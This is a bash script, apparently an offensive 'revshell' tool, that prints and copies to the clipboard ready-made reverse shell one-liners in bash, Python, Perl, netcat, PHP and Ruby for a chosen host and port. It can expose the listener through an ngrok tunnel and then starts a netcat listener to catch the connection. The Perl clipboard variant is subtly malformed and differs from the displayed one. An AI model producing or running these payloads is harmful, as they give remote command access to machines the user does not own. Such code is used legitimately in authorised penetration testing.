#!/bin/bash

#List of prerequisite tools
required_tools=("lolcat" "toilet" "xclip")

#Function to check if a tool is installed
check_tool(){
  command -v "$1" >/dev/null 2>&1
}


# Read package manager only once
package_manager=""

#Function to download and install a tool
install_tool() {
    tool_name="$1"

    if [ -z "$package_manager" ]; then
        echo "No package manager is set. Please enter your package manager (apt, dnf, pacman, yum):"
        read package_manager
    fi
    
    case "$package_manager" in
        apt)
            download_command="sudo apt-get install -y $tool_name"
            ;;
        dnf)
            download_command="sudo dnf install -y $tool_name"
            ;;
        pacman)
            download_command="sudo pacman -S --noconfirm $tool_name"
            ;;
        yum)
            download_command="sudo yum install -y $tool_name"
            ;;
        *)
            echo "Unsupported package manager: $package_manager. Please install $tool_name manually."
            exit 1
            ;;
    esac

    echo "Installing $tool_name with $package_manager..."
    eval "$download_command"

    # Check if installation was successful
    if check_tool "$tool_name"; then
        echo "$tool_name installed successfully."
    else
        echo "Failed to install $tool_name. Please install it manually."
        exit 1
    fi
}

for tool in "${required_tools[@]}"; do
    if ! check_tool "$tool"; then
        install_tool "$tool"
    fi
done

#Starting animation 
width=$(tput cols)
echo "revshell" | toilet -f mono12  -F border -F metal  -t -w "$width";
echo 
echo -e "\e[36mStreamline the creation of reverse shells in your language of choice using this powerful command-line tool.\e[0m"
while true; do

  read_green() {
    echo -en "\e[1;32m$1\e[0m"   # Display the prompt in red
    read $2
  }
  generate_reverse_shell() {
    local option="$1"
    local host="$2"
    local port="$3"
    
    case "$option" in
      1)
        echo "bash -i >& /dev/tcp/$host/$port 0>&1" | lolcat
        echo "bash -i >& /dev/tcp/$host/$port 0>&1" | xclip -selection clipboard  
        echo "Code copied to clipboard!!"
        ;;
      2)
        echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | lolcat   
        echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | xclip -selection clipboard  
        echo "Code copied to clipboard!!"
        ;;
      3)
        echo "export RHOST=\"$host\";export RPORT=$port;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'" | lolcat 
        echo "export RHOST=\"$host\";export RPORT=$port;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'" | xclip -selection clipboard 
        echo "Code copied to clipboard!!"
        ;;
      4)
        echo "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | lolcat 
        echo "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\";exec(\"/bin/sh -i\");};'" | xclip -selection clipboard 
        echo "Code copied to clipboard!!"
        ;;
      5)
        echo "nc -e /bin/sh $host $port" | lolcat 
        echo "nc -e /bin/sh $host $port" | xclip -selection clipboard 
        echo "Code copied to clipboard!!"
        ;;
      6)
        echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | lolcat 
        echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | xclip -selection clipboard 
        echo "Code copied to clipboard!!"
        ;;
      7)
        echo "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | lolcat 
        echo "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | xclip -selection clipboard 
        echo "Code copied to clipboard!!"
        ;;
    esac
  }
  # List of items
  items=("bash" "python" "python3" "perl" "nc" "PHP" "ruby")

  # Function to display the list in three columns with numbering in red
  display_list() {
    columns=3
    column_length=$(( (${#items[@]} + $columns - 1) / $columns ))

    for ((i = 0; i < $columns; i++)); do
      for ((j = i; j < ${#items[@]}; j += columns)); do
        index=$((j + 1))
        printf "\e[1;31m%-2d. %-15s\e[0m" $index "${items[j]}"

        if ((j + columns < ${#items[@]})); then
          printf "   "
        fi
      done
      echo
    done
  }

  # Display the list in red
  display_list
  echo

  # Get user input for language
  while true; do
    read_green "Choose an option:" option
    if [[ $option -ge 1 && $option -le 7 ]]; then
        break
    else
        echo -e "\e[1;31mInvalid option, please try again!!\e[0m"
    fi
  done

  # Option to use ngrok for public IP
  read -p "Do you want to use ngrok for public IP? (yes/NO): " use_ngrok
  if [[ "$use_ngrok" == "yes" ]]; then
    while true; do
      read -p "Enter the port for ngrok to listen on: " ngrok_port
      if [[ "$ngrok_port" =~ ^[0-9]+$ ]] && [ "$ngrok_port" -ge 1 ] && [ "$ngrok_port" -le 65535 ]; then
        break
      else
        echo "Invalid port. Please enter a valid port number (1-65535)."
      fi
    done
    ngrok tcp $ngrok_port > /dev/null &
    sleep 2
    host=$(curl --silent http://127.0.0.1:4040/api/tunnels | grep -Po '"public_url":"tcp://\K[^"]*')
    port=$(echo $host | cut -d':' -f2)
    host=$(echo $host | cut -d':' -f1)
    echo "Using ngrok, public IP: $host and port: $port"
    generate_reverse_shell "$option" "$host" "$port"
    echo "Setting up netcat listener on port $ngrok_port..."
    nc -lvp $ngrok_port 
    pkill ngrok
  else
    # Get user input for IP address
    while true; do
      read_green "Enter the IP address: " host
      if [[ "$host" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        IFS='.' read -r -a octets <<< "$host"
        valid=true
        for octet in "${octets[@]}"; do
          if ! ((octet >= 0 && octet <= 255)); then
            valid=false
            break
          fi
        done
        if $valid; then
          break
        else
          echo -e "\e[1;31mInvalid IP address, each octet must be between 0 and 255. Please try again!\e[0m"
        fi
      else
        echo -e "\e[1;31mInvalid IP address format, please try again!!\e[0m"
      fi
    done
    # Get user input for port
    while true; do
      read_green "Enter the port: " port
      if [[ "$port" =~ ^[0-9]+$ ]] && [ "$port" -ge 1 ] && [ "$port" -le 65535 ]; then
        break
      else
        echo -e "\e[1;31mInvalid port. Please enter a valid port number (1-65535).\e[0m"
      fi
    done
    generate_reverse_shell "$option" "$host" "$port"
    echo "Setting up netcat listener on port $port..."
    nc -lvp $port 
  fi

  

  echo "Type 'exit' to close the tool, or press Enter to continue..."
  read input
  if [ "$input" = "exit" ]; then
    break
  fi
done
